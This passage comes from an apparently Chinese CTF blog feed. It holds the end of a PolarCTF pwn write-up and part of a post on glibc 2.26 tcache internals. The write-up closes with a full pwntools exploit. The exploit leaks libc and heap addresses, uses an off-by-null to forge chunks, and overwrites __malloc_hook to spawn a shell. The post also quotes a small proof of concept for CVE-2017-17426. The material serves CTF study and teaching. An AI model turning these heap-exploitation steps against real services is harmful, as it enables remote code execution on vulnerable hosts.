                ></p>
<p>通过<code>find_fake_fast</code>来寻找<code>__malloc_hook</code>附近的<code>fake_chunk</code>。<code>fake_chunk</code>的<code>prev_size</code>距离<code>__malloc_hook</code>有0x23大小。所以填充<code>0x13</code>字节即可覆盖到目标地址。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911193629573.png"
                      alt="image-20230911193629573"
                ></p>
<p>我们可以通过<code>k</code>来查看函数调用栈，发现<code>free</code>报错后会在动态链接器调用<code>malloc</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911194307830.png"
                      alt="image-20230911194307830"
                ></p>
<p>可以在源码中发现，由于<code>free</code>一个错误堆块调用了<code>malloc_printerr</code>函数，最后在<code>dl-error.c</code>调用了<code>malloc</code>函数。</p>
<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">is_debug = <span class="literal">False</span></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">	<span class="keyword">global</span> elf, libc, p</span><br><span class="line">	elf = ELF(<span class="string">&#x27;./562+5Liq5Yiw&#x27;</span>)</span><br><span class="line">	libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> is_local:</span><br><span class="line">		p = process(<span class="string">&#x27;./562+5Liq5Yiw&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p = remote(<span class="string">&#x27;IP&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">gdbscript=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> is_debug:</span><br><span class="line">        gdb.attach(p, gdbscript=gdbscript)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">size, data, mark</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give me the size of the chicken. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give me the name of the chicken. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give the chicken a mark. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.send(mark)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Which chicken will you kill? \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Cook</span>(<span class="params">idx, name, cook</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Which chicken will you cook? \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Give me new name.\n&quot;</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Give me Cook name.\n&quot;</span>)</span><br><span class="line">	p.send(cook)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Black</span>():</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>():</span><br><span class="line">	<span class="keyword">global</span> __malloc_hook, libc_base</span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">20</span>) <span class="comment"># 0 errmsg_0x90-&gt;unsorted</span></span><br><span class="line">	Delete(<span class="number">0</span>) <span class="comment"># errmsg_0x90-&gt;unsorted</span></span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">20</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">20</span>) <span class="comment"># 0 # unsorted-&gt;errmsg_0x90</span></span><br><span class="line">	Black()</span><br><span class="line">	<span class="comment">#debug() # db1</span></span><br><span class="line">	p.recvuntil(<span class="string">b&quot;0\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m ErrMsg \x1B[0m\n&quot;</span>)</span><br><span class="line">	libc_base = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">	log.success(<span class="string">&quot;libc : 0x%x&quot;</span> % libc_base)</span><br><span class="line">	__malloc_hook = libc_base + libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">	sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_heap</span>():</span><br><span class="line">	<span class="keyword">global</span> heap_addr</span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;g&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 2</span></span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">	Delete(<span class="number">1</span>)</span><br><span class="line">	Delete(<span class="number">3</span>)</span><br><span class="line">	<span class="comment">#debug() # db2</span></span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">	Cook(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;cccccccn&#x27;</span>)</span><br><span class="line">	Black()</span><br><span class="line">	<span class="comment">#debug() # db3</span></span><br><span class="line">	p.recvuntil(<span class="string">b&quot;1\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m ErrMsg \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;cccccccn&#x27;</span>)</span><br><span class="line">	heap_addr = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	log.success(<span class="string">&quot;heap : 0x%x&quot;</span> % heap_addr)</span><br><span class="line">	sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_shell</span>():</span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">	Add(<span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x320</span>) + p64(heap_addr+<span class="number">0x190</span>) + p64(heap_addr+<span class="number">0x190</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 4 first 0x71</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 5</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 7</span></span><br><span class="line">	<span class="comment">#debug() # db4</span></span><br><span class="line">	Delete(<span class="number">6</span>)</span><br><span class="line">	<span class="comment">#debug() # db5</span></span><br><span class="line">	Add(<span class="number">0x68</span>, <span class="string">b&#x27;k&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x320</span>), <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6 off-by-null</span></span><br><span class="line">	<span class="comment">#debug() # db6</span></span><br><span class="line">	Delete(<span class="number">6</span>)</span><br><span class="line">	<span class="comment">#debug() # db7</span></span><br><span class="line">	Add(<span class="number">0x2D0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2A0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(__malloc_hook-<span class="number">0x23</span>) + p64(<span class="number">0xdeadbeef</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6</span></span><br><span class="line">	<span class="comment">#debug() # db8</span></span><br><span class="line">	Delete(<span class="number">0</span>)</span><br><span class="line">	Delete(<span class="number">1</span>)</span><br><span class="line">	Delete(<span class="number">2</span>)</span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">	one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(libc_base+one[<span class="number">1</span>]), <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#gdb.attach(p, &#x27;b *_dl_signal_error&#x27;)</span></span><br><span class="line">	Delete(<span class="number">4</span>)</span><br><span class="line">	<span class="comment">#pause()</span></span><br><span class="line">	sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">	connect()</span><br><span class="line">	get_libc()</span><br><span class="line">	get_heap()</span><br><span class="line">	get_shell()</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn题解</tag>
      </tags>
  </entry>
  <entry>
    <title>Tcache安全机制及赛题详细解析</title>
    <url>/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="Tcache简介"><a href="#Tcache简介" class="headerlink" title="Tcache简介"></a>Tcache简介</h1><p><a class="link"   href="https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c" >glibc 源码网址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>  ptmallloc2在libc2.26中引入了Tcache这种无需对arena上锁就可以使用的小堆块。<strong>tcache是单链表结构</strong>，每条链上最多可以有 <strong>7</strong> 个 chunk，free 的时候当对应的 tcache bin 满了才放入fastbin，unsorted bin，malloc的时候优先去tcache bin找。</p>
<p>其数据结构如下。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">/* 最大64个bins */</span><br><span class="line">#define TCACHE_MAX_BINS 64  </span><br><span class="line">#define MAX_TCACHE_SIZE tidx2usize (TCACHE_MAX_BINS-1)</span><br><span class="line">#define tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><span class="line">#define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="line">#define usize2tidx(x) csize2tidx (request2size (x))</span><br><span class="line">/* 每个bins最多缓存7个chunk */</span><br><span class="line">#define TCACHE_FILL_COUNT 7</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">typedef struct tcache_entry &#123;</span><br><span class="line">  struct tcache_entry *next;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"> /*</span><br><span class="line"> *  tcache_entry 用于链接空闲的 chunk 结构体，其中的 next 指针指向下一个大小相同的 chunk。</span><br><span class="line"> *  需要注意的是这里的 next 指向 chunk 的 user_data ，而 fastbin 的 fd 指向 chunk 开头(prev_size)的地址。</span><br><span class="line"> *  而且，tcache_entry 会复用空闲 chunk 的 user_data 部分。</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">// tcache_perthread_struct位于堆的开头，大小为0x250。  </span><br><span class="line">typedef struct tcache_perthread_struct &#123;</span><br><span class="line">  char counts[TCACHE_MAX_BINS];              //用于存放bins中的chunk数量。</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];    //用于存放64个bins地址</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line">static __thread tcache_perthread_struct *tcache = NULL;</span><br><span class="line"> /* </span><br><span class="line"> *    每个 thread 都会维护一个 tcache_perthread_struct，一共有 TCACHE_MAX_BINS 个计数器和 TCACHE_MAX_BINS 项 tcache_entry,</span><br><span class="line"> *  ·tcache_entry 用单向链表的方式链接了相同大小的处于空闲状态（free后）的 chunk。</span><br><span class="line"> *  ·counts 记录了 tcache_entry 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk。</span><br><span class="line"> */</span><br></pre></td></tr></table></figure></div>

<p>  每个线程默认<strong>64</strong>个单链表结构的bins，每个bins最多存放<strong>7</strong>个chunk。chunk在64位机器以16字节递增，从24到1032字节。在32位机器上以8字节递增，从12到512字节。因此tcache只能存放<strong>non-large</strong>的chunk。</p>
<p>图解</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_3VXXSF45THTQ63W.jpg"
                      alt="img"
                ></p>
<h1 id="Tcache实现"><a href="#Tcache实现" class="headerlink" title="Tcache实现"></a>Tcache实现</h1><h2 id="Tcache初始化"><a href="#Tcache初始化" class="headerlink" title="Tcache初始化"></a>Tcache初始化</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">tcache_init(void)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  void *victim = 0;</span><br><span class="line">  const size_t bytes = sizeof (tcache_perthread_struct); //大小为0x240</span><br><span class="line"></span><br><span class="line">  if (tcache_shutting_down)</span><br><span class="line">    return;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  /* 使用_int_malloc为 tcache_perthread_struct 分配内存 */</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  /* 分配失败则再次尝试分配 */</span><br><span class="line">  if (!victim &amp;&amp; ar_ptr != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  /* __libc_lock_unlock 是一个宏，用于释放一个互斥锁 */</span><br><span class="line">  if (ar_ptr != NULL)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  if (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      /* 转换为tcache_perthread_struce结构 */</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      /* 初始为0 */</span><br><span class="line">      memset (tcache, 0, sizeof (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="分配堆块时"><a href="#分配堆块时" class="headerlink" title="分配堆块时"></a>分配堆块时</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* glibc2.26没有对放入的chunk进行严格校验的，也没有把P位置零 */</span><br><span class="line">static __always_inline void</span><br><span class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  /* 放在头部，和插入fastbin的插入形式是一致的 */</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">*    malloc出来的chunk为fast chunk，</span><br><span class="line">*  那么fastbin中相应大小的chunk会被放入tcache相应大小的tcache bins中，</span><br><span class="line">*  直到相应的tcache bins满7个或者相应的fastbins为空。</span><br><span class="line">*  chunk在tcache bin中顺序与fastbin相反</span><br><span class="line">*/</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">      size_t tc_idx = csize2tidx (nb);</span><br><span class="line">      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                 &amp;&amp; (pp = *fb) != NULL)</span><br><span class="line">            &#123;</span><br><span class="line">              REMOVE_FB (fb, tc_victim, pp);</span><br><span class="line">              if (tc_victim != 0)</span><br><span class="line">                &#123;</span><br><span class="line">                  tcache_put (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">*   malloc出来的chunk是small chunk。和fast chunk类似。</span><br><span class="line">*      但是会对每一个chunk的next_chunk的prev_inuse位设置为1。</span><br><span class="line">*   chunk在tcache bin中顺序与small bin中顺序相同。</span><br><span class="line">*/</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">      size_t tc_idx = csize2tidx (nb);</span><br><span class="line">      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line">          </span><br><span class="line">          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">             &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">            &#123;</span><br><span class="line">              if (tc_victim != 0)</span><br><span class="line">                &#123;</span><br><span class="line">                  bck = tc_victim-&gt;bk;</span><br><span class="line">                  /* 设置标志位 */</span><br><span class="line">                  set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">                  if (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena (tc_victim);</span><br><span class="line">                  bin-&gt;bk = bck;</span><br><span class="line">                  bck-&gt;fd = bin;</span><br><span class="line">    </span><br><span class="line">                  tcache_put (tc_victim, tc_idx);</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">#endif</span><br><span class="line">/*  </span><br><span class="line">*    如果unsorted chunk跟要用户所需要chunk大小一致，那么会优先将该chunk挂入对应的tcache中，并不直接返回</span><br><span class="line">*/</span><br><span class="line">          if (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              if (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena (victim);</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">                  if (tcache_nb</span><br><span class="line">                      &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">                    &#123;</span><br><span class="line">                      tcache_put (victim, tc_idx);</span><br><span class="line">                      return_cached = 1;</span><br><span class="line">                      continue;</span><br><span class="line">                    &#125;</span><br><span class="line">                  else</span><br><span class="line">                    &#123;</span><br><span class="line">#endif</span><br><span class="line">                  check_malloced_chunk (av, victim, nb);</span><br><span class="line">                  void *p = chunk2mem (victim);</span><br><span class="line">                  alloc_perturb (p, bytes);</span><br><span class="line">                  return p;</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">                    &#125;</span><br><span class="line">#endif</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="从Tcache取出堆块"><a href="#从Tcache取出堆块" class="headerlink" title="从Tcache取出堆块"></a>从Tcache取出堆块</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* glibc2.26取出chunk并没有严格的检查，由于tcache优先级很高，所以其他的检查机制并没有对tcache发挥过多作用 */</span><br><span class="line">static __always_inline void *</span><br><span class="line">tcache_get (size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; 0);</span><br><span class="line">  /* 取出chunk */</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  /* counts记录相应bins的chunk数量,取出时减一 */</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  return (void *) e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* </span><br><span class="line">* 如果用户需要的chunk size 属于 non-large chunk并且 tcache 已经初始化并且对应tcache bins中有符合chunk则取出</span><br><span class="line">* 注意从tcache中取出块是在进入_int_malloc()之前的</span><br><span class="line">*/</span><br><span class="line">if (tc_idx &lt; mp_.tcache_bins </span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)</span><br><span class="line">&#123;</span><br><span class="line">  return tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* </span><br><span class="line">*   在unsorted bin最后，如果找到了可以返回的块，</span><br><span class="line">*   并且mp_.tcache_unsorted_limit次数小于处理unsorted count(即tcache中装满了对应的chunk)</span><br><span class="line">*   那么就会从其中拉出一个chunk出来返回</span><br><span class="line">*/</span><br><span class="line">.tcache_unsorted_limit = 0 </span><br><span class="line">#if USE_TCACHE</span><br><span class="line">      /* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span><br><span class="line">     filling the cache, return one of the cached ones.  */</span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      if (return_cached</span><br><span class="line">      &amp;&amp; mp_.tcache_unsorted_limit &gt; 0</span><br><span class="line">      &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">    &#123;</span><br><span class="line">      return tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">/*  </span><br><span class="line">*    在unsorted bin的遍历之后 如果unsorted bin中存在可以返回的chunk</span><br><span class="line">*    那么在遍历unsorted bin之后则调用一次tcache_get返回给用户使用 </span><br><span class="line">*/</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">    if (return_cached)</span><br><span class="line">    &#123;</span><br><span class="line">      return tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure></div>

<h2 id="释放堆块时"><a href="#释放堆块时" class="headerlink" title="释放堆块时"></a>释放堆块时</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* </span><br><span class="line">*    如果tcache已经初始化</span><br><span class="line">*    并且free的chunk属于non-large chunk</span><br><span class="line">*    如果free的chunk对应的tcache链未满7个 </span><br><span class="line">*    那么就将chunk放入到tcahce中缓存</span><br><span class="line">*/</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">  &#123;</span><br><span class="line">    size_t tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    if (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">            tcache_put (p, tc_idx);</span><br><span class="line">            return;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure></div>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li><p>释放堆块时：如果chunk是<strong>non-large chunk</strong>，并且对应bins未满7个，则放入对应bins。</p>
</li>
<li><p>分配堆块时：</p>
<p>（1）如果fastbins或者small bins中成功返回一个需要的chunk，那么对应fastbins或者small bins中的剩余chunk会被放进相应的tcache  bin中，直到相应tcache bin填满7个或者对应的fastbins或者small bins为空。<strong>chunk在tcache bin中顺序与fastbin相反，与small bin中顺序相同。</strong></p>
<p>（2）unsorted bin 中符合用户要求的的chunk取出时，chunk 合并等其他操作，每一个符合要求的chunk会<strong>优先放入tcache</strong>，然后从 tcache 中返回其中一个。如果tcache已满则直接返回。</p>
</li>
<li><p>从tcache中取出堆块。</p>
<p>（1）<strong>在__libc_malloc()调用_int_malloc()前</strong>，如果tcache bin中有符合要求的chunk，则直接返回。</p>
<p>（2）**(默认不执行)**。在unsorted bin最后如果找到了可以返回的块，并且 <strong>mp_.tcache_unsorted_limit(默认为0)</strong> 次数小于处理 unsorted count(即tcache中装满了对应的chunk)那么就会从其中拉出一个chunk出来返回。</p>
<p>（3）在unsorted bin的遍历之后 如果unsorted bin中存在可以返回的chunk 那么在<strong>遍历unsorted bin</strong>之后，则调用一次<strong>tcache_get</strong>返回给用户使用。</p>
</li>
<li><p>tcache中的chunk不会合并。chunk的prev_inuse&#x3D;1。</p>
</li>
</ol>
<h1 id="安全分析"><a href="#安全分析" class="headerlink" title="安全分析"></a>安全分析</h1><h2 id="cve-2017-17426"><a href="#cve-2017-17426" class="headerlink" title="cve-2017-17426"></a>cve-2017-17426</h2><p>  __libc_malloc()使用request2size()转换堆块为实际大小时，不会进行整数溢出检查。请求一个接近(SIZE_MAX)的堆块将导致溢出，使malloc错误返回tcache bin中的堆块。</p>
<p>源码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">    void *x = malloc(10);</span><br><span class="line">    printf(&quot;malloc(10): %p\n&quot;,x);</span><br><span class="line">    free(x);</span><br><span class="line">    </span><br><span class="line">    void *y = malloc(((size_t)~0) - 2);</span><br><span class="line">    printf(&quot;malloc(((size_t)~0) - 2): %p\n&quot;,y);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>使用glibc-2.26的输出，分配成功。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
